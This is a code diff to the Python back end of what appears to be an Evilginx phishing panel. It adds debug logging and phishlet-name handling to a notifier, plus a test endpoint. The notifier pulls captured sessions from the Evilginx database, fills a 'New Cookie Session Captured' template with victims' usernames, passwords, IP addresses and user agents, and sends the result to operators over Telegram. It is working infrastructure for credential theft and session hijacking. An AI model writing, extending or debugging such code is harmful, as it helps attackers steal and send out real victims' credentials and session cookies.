@@ -450,7 +450,7 @@ def send_notifications(session_data):
     
     try:
         config = load_config()
-        print(f"[NOTIFICATIONS] Starting notification for session ID: {session_data.get('id', 0)}")
+        safe_print(f"[NOTIFICATIONS] Starting notification for session ID: {session_data.get('id', 0)}")
         
         # No TXT file needed - just send message template
         txt_file_path = None
@@ -469,6 +469,29 @@ def send_notifications(session_data):
         phishlet = session_data.get("phishlet", "N/A")
         create_time = session_data.get("create_time", 0)
         
+        # Debug: Print session data keys and phishlet value (use safe_print for Unicode)
+        try:
+            safe_print(f"[NOTIFICATIONS] Session data keys: {list(session_data.keys())}")
+            safe_print(f"[NOTIFICATIONS] Phishlet value from session_data: '{phishlet}' (type: {type(phishlet)})")
+            safe_print(f"[NOTIFICATIONS] Raw session_data.get('phishlet'): {session_data.get('phishlet')}")
+        except Exception as e:
+            print(f"[NOTIFICATIONS] Error printing debug info: {e}")
+        
+        # If phishlet is missing, try to get it from database directly
+        if not phishlet or phishlet == "N/A" or phishlet == "":
+            safe_print(f"[NOTIFICATIONS] Phishlet missing from session_data, attempting to fetch from database...")
+            try:
+                db_path = config.get("evilginx_db_path", "config/evilginx.db")
+                all_sessions = get_all_sessions(db_path, limit=10)
+                # Find the session with matching ID
+                for sess in all_sessions:
+                    if sess.get("id") == session_id:
+                        phishlet = sess.get("phishlet", "N/A")
+                        safe_print(f"[NOTIFICATIONS] Found phishlet in database: '{phishlet}'")
+                        break
+            except Exception as e:
+                safe_print(f"[NOTIFICATIONS] Error fetching phishlet from database: {e}")
+        
         # Format timestamp
         if create_time:
             try:
@@ -479,13 +502,55 @@ def send_notifications(session_data):
             time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
         # Replace placeholders in template (escape values for MarkdownV2)
-        message = notification_template.replace("{phishlet}", escape_markdownv2(str(phishlet)))
+        # Use safe_print and avoid printing emojis directly
+        template_preview = notification_template[:200].replace('\U0001f36a', '[COOKIE]').replace('\\!', '[!]')
+        safe_print(f"[NOTIFICATIONS] Template before replacement: {template_preview}...")
+        safe_print(f"[NOTIFICATIONS] Checking if '{{phishlet}}' exists in template: {'{phishlet}' in notification_template}")
+        
+        # Ensure phishlet is not None or empty - try multiple possible keys
+        if not phishlet or phishlet == "N/A" or phishlet == "":
+            # Try alternative keys that might contain phishlet (case variations)
+            phishlet = (session_data.get("phishlet") or 
+                       session_data.get("Phishlet") or 
+                       session_data.get("PHISHLET") or
+                       (session_data.get("phishlet", "") if session_data.get("phishlet") else None) or
+                       "N/A")
+            safe_print(f"[NOTIFICATIONS] Phishlet after fallback check: '{phishlet}'")
+        
+        # Convert phishlet to string and ensure it's not empty
+        phishlet_str = str(phishlet).strip() if phishlet and phishlet != "N/A" else "N/A"
+        if not phishlet_str or phishlet_str == "":
+            phishlet_str = "N/A"
+        
+        safe_print(f"[NOTIFICATIONS] Final phishlet value to use: '{phishlet_str}'")
+        
+        # Replace placeholders - do phishlet first since it might be the issue
+        message = notification_template
+        if "{phishlet}" in message:
+            message = message.replace("{phishlet}", escape_markdownv2(phishlet_str))
+            safe_print(f"[NOTIFICATIONS] SUCCESS: Replaced {{phishlet}} with '{phishlet_str}'")
+        else:
+            safe_print(f"[NOTIFICATIONS] WARNING: {{phishlet}} not found in template!")
+        
+        message_preview = message[:200].replace('\U0001f36a', '[COOKIE]').replace('\\!', '[!]')
+        safe_print(f"[NOTIFICATIONS] Message after phishlet replacement: {message_preview}...")
         message = message.replace("{session_id}", escape_markdownv2(str(session_id)))
         message = message.replace("{username}", escape_markdownv2(username))
         message = message.replace("{password}", escape_markdownv2(password))
         message = message.replace("{remote_addr}", escape_markdownv2(remote_addr))
         message = message.replace("{useragent}", escape_markdownv2(useragent))
         message = message.replace("{time}", escape_markdownv2(time_str))
+        
+        # Final check - if {phishlet} still exists, log warning and try to fix
+        if "{phishlet}" in message:
+            safe_print(f"[NOTIFICATIONS] WARNING: {{phishlet}} placeholder was NOT replaced in final message!")
+            safe_print(f"[NOTIFICATIONS] Attempting manual replacement...")
+            # Try one more time with the actual string
+            message = message.replace("{phishlet}", escape_markdownv2(phishlet_str))
+            if "{phishlet}" in message:
+                safe_print(f"[NOTIFICATIONS] ERROR: Still contains {{phishlet}} after manual replacement!")
+                # Last resort: replace with N/A
+                message = message.replace("{phishlet}", "N/A")
         
         # Check Telegram configuration
         telegram_enable = config.get("telegram_enable", False)
@@ -1509,67 +1574,23 @@ def test_session_notification():
         
         # Send test notification using the most recent session
         print(f"[TEST] Sending test notification for session ID: {latest_session.get('id', 0)}")
+        print(f"[TEST] Session data keys: {list(latest_session.keys())}")
+        print(f"[TEST] Phishlet in session: {latest_session.get('phishlet', 'NOT FOUND')}")
         
-        # Call send_notifications and check if it succeeds by calling send_telegram_notification directly
-        # This way we can return proper success/error status
+        # Use send_notifications() directly to ensure all debug logs and phishlet handling work correctly
         try:
-            # Format the notification message (same as send_notifications does)
-            notification_template = config.get("notification_incoming_cookie", 
-                "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━")
+            # Call send_notifications which handles all the formatting and phishlet replacement
+            send_notifications(latest_session)
             
-            from datetime import datetime
-            session_id = latest_session.get("id", 0)
-            username = latest_session.get("username", "N/A")
-            password = latest_session.get("password", "N/A")
-            remote_addr = latest_session.get("remote_addr", "N/A")
-            useragent = latest_session.get("useragent", "N/A")
-            create_time = latest_session.get("create_time", 0)
-            
-            if create_time:
-                try:
-                    time_str = datetime.fromtimestamp(create_time).strftime("%Y-%m-%d %H:%M:%S")
-                except:
-                    time_str = str(create_time)
-            else:
-                time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            
-            # Replace placeholders
-            message = notification_template.replace("{session_id}", escape_markdownv2(str(session_id)))
-            message = message.replace("{username}", escape_markdownv2(username))
-            message = message.replace("{password}", escape_markdownv2(password))
-            message = message.replace("{remote_addr}", escape_markdownv2(remote_addr))
-            message = message.replace("{useragent}", escape_markdownv2(useragent))
-            message = message.replace("{time}", escape_markdownv2(time_str))
-            
-            # Send notification to all admins
-            web_url = config.get("web_url", "http://localhost:5004")
-            support_telegram = config.get("support_telegram")
-            
-            sent_count, failed_count = send_notifications_to_all_admins(
-                message,
-                file_path=None,
-                session_id=session_id,
-                web_url=web_url,
-                support_telegram=support_telegram,
-                config=config
-            )
-            
-            if sent_count > 0:
-                return jsonify({
-                    "status": "success",
-                    "message": f"Test notification sent successfully to {sent_count} admin(s) using session ID: {latest_session.get('id', 0)}",
-                    "session_id": latest_session.get('id', 0),
-                    "username": latest_session.get('username', 'N/A'),
-                    "sent_count": sent_count,
-                    "failed_count": failed_count
-                })
-            else:
-                return jsonify({
-                    "status": "error",
-                    "message": "Failed to send test notification. No admins received the message. Make sure at least one admin has configured Telegram bot token and chat ID.",
-                    "session_id": latest_session.get('id', 0),
-                    "username": latest_session.get('username', 'N/A')
-                }), 500
+            # Since send_notifications doesn't return counts, we'll assume success if no exception
+            # The debug logs will show what actually happened
+            return jsonify({
+                "status": "success",
+                "message": f"Test notification sent using session ID: {latest_session.get('id', 0)}. Check terminal logs for details.",
+                "session_id": latest_session.get('id', 0),
+                "username": latest_session.get('username', 'N/A'),
+                "phishlet": latest_session.get('phishlet', 'N/A')
+            })
         except Exception as e:
             safe_print(f"[TEST] Error in test notification: {e}")
             return jsonify({
